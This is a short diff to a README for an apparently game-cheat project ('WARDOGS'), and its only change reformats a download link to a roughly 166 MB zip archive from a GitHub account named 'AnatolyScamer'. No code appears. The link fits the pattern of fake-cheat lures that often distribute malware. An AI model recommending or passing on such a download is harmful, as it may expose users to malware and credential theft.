@@ -16,7 +16,7 @@ The project provides a collection of gameplay tools, including visual informatio
 
 ## ⬇️ Download
 
-[**Download Now**] (https://github.com/AnatolyScamer/WARDOGS-Che-t/archive/refs/tags/WARDOGS_CHEAT.zip)
+[**DOWNLOAD**](https://github.com/AnatolyScamer/WARDOGS-Che-t/archive/refs/tags/WARDOGS_CHEAT.zip)
 
 **Latest Version:** `v2.6.0` • **File Size:** ~166 MB
 
